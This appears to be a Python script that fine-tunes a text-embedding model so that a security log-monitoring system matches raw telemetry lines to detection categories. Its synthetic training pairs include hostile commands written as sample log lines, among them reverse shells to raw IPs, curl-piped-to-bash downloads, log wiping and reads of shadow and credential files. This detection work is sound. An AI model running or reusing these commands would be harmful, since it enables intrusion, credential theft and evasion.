"""
Bootstrap contrastive fine-tuning for the Cerise retrieval encoder.

Theory: nomic-embed-text-v1.5 was pretrained on general web text pairs, not on the
specific vocabulary/style gap between terse kernel/network telemetry and this
project's fact-sheet prose -- exactly the domain-gap problem eval_rag.py measures
(untresholded top-1 accuracy was 19/27 = 70% with the stock model). Fine-tuning with
MultipleNegativesRankingLoss (in-batch negatives, an InfoNCE-style contrastive loss)
pulls each (log, correct-section) pair together in embedding space while pushing
every other pair in the current batch apart -- directly optimizing the geometry that
RagRetriever.retrieve_context() relies on, instead of hoping a general-purpose
encoder happens to transfer to this domain.

There is no real production log corpus yet, so TRAIN_PAIRS below is a small,
hand-written synthetic set -- deliberately disjoint (different phrasing) from
eval_rag.py's EVAL_SET, so hit-rate@1 there stays an honest, unseen-data measure of
whether fine-tuning actually helped. Treat the result as a bootstrap starting point:
re-run with real accumulated (and ideally human-reviewed) production logs as they
become available, and always re-validate with eval_rag.py before pointing MODEL_NAME
in indexer.py / log_watcher*.py at the fine-tuned checkpoint -- this script does not
wire the new model into production automatically.

Usage: python finetune_embeddings.py
       python indexer.py            # re-index using the new MODEL_NAME, if you adopt it
       python eval_rag.py           # confirm hit-rate@1 actually improved before adopting
"""
import chromadb
from datasets import Dataset
from sentence_transformers import SentenceTransformer, SentenceTransformerTrainer, SentenceTransformerTrainingArguments
from sentence_transformers.losses import MultipleNegativesRankingLoss

BASE_MODEL = "nomic-ai/nomic-embed-text-v1.5"
OUTPUT_DIR = "models/cerise-embed-v1"
DB_DIR = "vector_db"
COLLECTION_NAME = "security_docs"
EPOCHS = 6
BATCH_SIZE = 8

QUERY_PREFIX = "search_query: "
DOCUMENT_PREFIX = "search_document: "

# (raw log line, category file). One category ("Anomaly Patterns" section) is the
# positive target. Deliberately worded differently from eval_rag.py's EVAL_SET.
TRAIN_PAIRS = [
    ("comm=httpd pid=3312 uid=33 ptrace(PTRACE_ATTACH) target=sshd_pid_812", "dangerous_syscalls.md"),
    ("comm=worker pid=204 bpf(BPF_PROG_ATTACH) called from non-observability binary", "dangerous_syscalls.md"),
    ("comm=app pid=77 mount(2) new overlayfs from unprivileged container process", "dangerous_syscalls.md"),
    ("comm=svc pid=901 setns(CLONE_NEWPID) invoked outside container runtime", "dangerous_syscalls.md"),

    ("comm=curl pid=442 PUT /v1.43/containers/create via AF_UNIX /var/run/docker.sock", "docker_socket_access.md"),
    ("comm=python3 pid=88 socket connect to /var/run/docker.sock from web app container", "docker_socket_access.md"),
    ("comm=sh pid=91 bind-mount host docker.sock into unrelated pod", "docker_socket_access.md"),
    ("comm=busybox pid=12 opens /var/run/docker.sock with O_RDWR", "docker_socket_access.md"),

    ("comm=loader pid=61 memfd_create('', 0) followed by execveat on the anonymous fd", "fileless_execution.md"),
    ("comm=x pid=62 mmap(PROT_EXEC|PROT_WRITE) region populated over the network, no on-disk file", "fileless_execution.md"),
    ("comm=sh pid=63 curl http://185.9.2.1/stage2.sh | bash", "fileless_execution.md"),
    ("comm=py pid=64 python -c \"import os; os.system(downloaded_payload)\"", "fileless_execution.md"),

    ("comm=insmod pid=15 init_module() loading unsigned .ko from /tmp/.x", "kernel_module_load.md"),
    ("comm=root pid=16 modprobe custom_driver not present in the official module list", "kernel_module_load.md"),
    ("comm=sh pid=17 writes to /sys/module/*/parameters outside of boot sequence", "kernel_module_load.md"),
    ("comm=x pid=18 finit_module() targeting a module dropped seconds earlier", "kernel_module_load.md"),

    ("comm=bash pid=210 shred -u /var/log/auth.log", "log_tampering.md"),
    ("comm=sh pid=211 export HISTSIZE=0; unset HISTFILE", "log_tampering.md"),
    ("comm=x pid=212 sed -i '/failed password/d' /var/log/secure", "log_tampering.md"),
    ("comm=root pid=213 kill -9 $(pidof rsyslogd)", "log_tampering.md"),

    ("comm=bash pid=560 reverse shell: bash -i >& /dev/tcp/91.4.2.9/4444 0>&1", "network_suspicious.md"),
    ("comm=py pid=561 outbound connection to Tor exit relay port 9050", "network_suspicious.md"),
    ("comm=nc pid=562 nc -lvp 1337 -e /bin/bash", "network_suspicious.md"),
    ("comm=curl pid=563 beaconing to raw IP 45.9.12.3 every 60s, no DNS lookup", "network_suspicious.md"),

    ("comm=app pid=910 setuid(0) from a process that never had CAP_SETUID before", "privilege_escalation.md"),
    ("comm=sh pid=911 pkexec exploited: unexpected root shell from unprivileged uid=1000", "privilege_escalation.md"),
    ("comm=x pid=912 capset() adds CAP_SYS_ADMIN to an app-tier worker process", "privilege_escalation.md"),
    ("comm=find pid=913 chmod 4755 /tmp/.hidden/su_clone", "privilege_escalation.md"),

    ("comm=cat pid=890 cat /etc/shadow from a process outside the auth stack", "sensitive_file_access.md"),
    ("comm=py pid=891 open(~/.aws/credentials) by an unrelated batch job", "sensitive_file_access.md"),
    ("comm=sh pid=892 tar czf /tmp/x.tgz /etc/kubernetes/pki/", "sensitive_file_access.md"),
    ("comm=x pid=893 read /root/.ssh/id_ed25519 triggered by a cron entry added today", "sensitive_file_access.md"),

    ("comm=nginx pid=110 execve('/bin/sh', ['-c', 'id']) spawned from a request handler", "suspicious_exec.md"),
    ("comm=java pid=111 execve('/tmp/.cache/.a', []) recently-written binary in a temp dir", "suspicious_exec.md"),
    ("comm=www-data pid=112 execve('/bin/bash', ['-c', 'echo <b64> | base64 -d | bash'])", "suspicious_exec.md"),
    ("comm=php pid=113 execve('/usr/bin/perl', ['-e', reverse_shell_oneliner])", "suspicious_exec.md"),
]


def load_positive_texts():
    client = chromadb.PersistentClient(path=DB_DIR)
    collection = client.get_collection(name=COLLECTION_NAME)
    categories = {cat for _, cat in TRAIN_PAIRS}
    # index 1 == "Anomaly Patterns" chunk, per indexer.py's SECTION_HEADERS ordering --
    # the section a raw log line should actually match against.
    ids = [f"{cat}:1" for cat in categories]
    data = collection.get(ids=ids, include=["documents"])
    return dict(zip([i.split(":")[0] for i in data["ids"]], data["documents"]))


def build_dataset():
    positive_texts = load_positive_texts()
    anchors, positives = [], []
    for log_line, category in TRAIN_PAIRS:
        anchors.append(QUERY_PREFIX + log_line)
        positives.append(DOCUMENT_PREFIX + positive_texts[category])
    return Dataset.from_dict({"anchor": anchors, "positive": positives})


def main():
    print(f"Loading base model '{BASE_MODEL}'...")
    model = SentenceTransformer(BASE_MODEL, trust_remote_code=True)

    train_dataset = build_dataset()
    print(f"Training on {len(train_dataset)} synthetic (log, section) pairs across "
          f"{len({c for _, c in TRAIN_PAIRS})} categories...")

    loss = MultipleNegativesRankingLoss(model)
    args = SentenceTransformerTrainingArguments(
        output_dir=OUTPUT_DIR,
        num_train_epochs=EPOCHS,
        per_device_train_batch_size=BATCH_SIZE,
        save_strategy="no",
        logging_steps=5,
    )
    trainer = SentenceTransformerTrainer(
        model=model,
        args=args,
        train_dataset=train_dataset,
        loss=loss,
    )
    trainer.train()

    model.save(OUTPUT_DIR)
    print(f"\nSaved fine-tuned model to '{OUTPUT_DIR}'.")
    print("This model is NOT wired into production. To adopt it:")
    print(f"  1. Set MODEL_NAME = '{OUTPUT_DIR}' in indexer.py, log_watcher.py, log_watcher_injector.py")
    print("  2. Re-run: python indexer.py   (re-embeds RAG_docs with the new model)")
    print("  3. Re-run: python eval_rag.py  (confirm hit-rate@1 actually improved on unseen examples)")


if __name__ == "__main__":
    main()
